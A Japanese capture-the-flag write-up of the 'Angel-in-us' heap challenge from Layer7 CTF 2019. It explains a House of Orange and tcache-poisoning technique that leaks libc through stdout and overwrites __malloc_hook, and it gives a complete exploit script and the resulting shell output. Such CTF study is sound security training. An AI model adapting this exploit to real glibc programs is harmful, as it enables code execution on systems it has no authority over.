# [pwn 1000pts] Angel-in-us - Layer7 CTF 2019
64ビットでPIE以外無効です。
```
$ checksec -f docker/problem
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes     0               2       docker/problem
```
ヒープ系問題ですが、mallocとeditしかないという絶望的状況です。editにヒープオーバーフローがあるので、House of Orangeで適当な大きさのチャンクをtcacheに繋げます。そのあとヒープオーバーフローでfdをstdoutに書き換え、`_IO_2_1_stdout_`をぶち壊してlibc leakします。あとは同様にHouse of Orangeからのヒープオーバーフローで`__malloc_hook`などを書き換えます。
```python
from ptrlib import *

def add(size, data):
    sock.sendlineafter("> ", "M")
    sock.sendlineafter("> ", str(size))
    sock.sendafter("> ", data)
    return

def edit(size, data):
    sock.sendlineafter("> ", "E")
    sock.sendlineafter("> ", str(size))
    sock.sendafter("> ", data)
    return

"""
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./docker/problem")
libc_one_gadget = 0x10a38c
"""
libc = ELF("./docker/libc.so.6")
sock = Socket("211.239.124.246", 12404)
libc_one_gadget = 0x106ef8
#"""
addr_stdout = 0x404020

# use top chunk to make its size 0x130
for i in range(10):
    add(0x128, "PON!")
add(0x78, "PON!")

# house of orange
add(0x10, "A" * 0x10)
payload = b'A' * 0x10
payload += p64(0) + p64(0x131)
edit(0x20, payload)
sock.sendlineafter("> ", "M")
sock.sendlineafter("> ", "1" * 0x400)

# corrupt stdout
payload  = b"A" * 0x10
payload += p64(0) + p64(0x111) + p64(addr_stdout)
edit(0x10 + 0x18, payload)
add(0x108, "dummy")
add(0x108, "\x60") # stdout: don't corrupt this
add(0x108, p64(0xfbad1800) + p64(0) * 3 + b"\x88")

# libc leak
libc_base = u64(sock.recvline()[:8]) - libc.symbol("_IO_2_1_stdout_") - 131
logger.info("libc base = " + hex(libc_base))

# use top chunk
for i in range(13):
    add(0x118, "PONPON!!")

# house of orange
add(0x80, "A" * 0x10)
payload = b'A' * 0x80
payload += p64(0) + p64(0xd1)
edit(0x90, payload)
sock.sendlineafter("> ", "M")
sock.sendlineafter("> ", "1" * 0x500)
payload = b'A' * 0x80
payload += p64(0) + p64(0xb1)
payload += p64(libc_base + libc.symbol("__malloc_hook"))
edit(0x98, payload)

# overwrite __free_hook
add(0xa8, "dummy")
add(0xa8, p64(libc_base + libc_one_gadget))

# get the shell!
sock.sendlineafter("> ", "M")
sock.sendlineafter("> ", "10")

sock.interactive()
```

わーい。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=23603)
[+] <module>: libc base = 0x7f7d5039d000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
House of Orangeを使ったのは初めてで面白かったです。
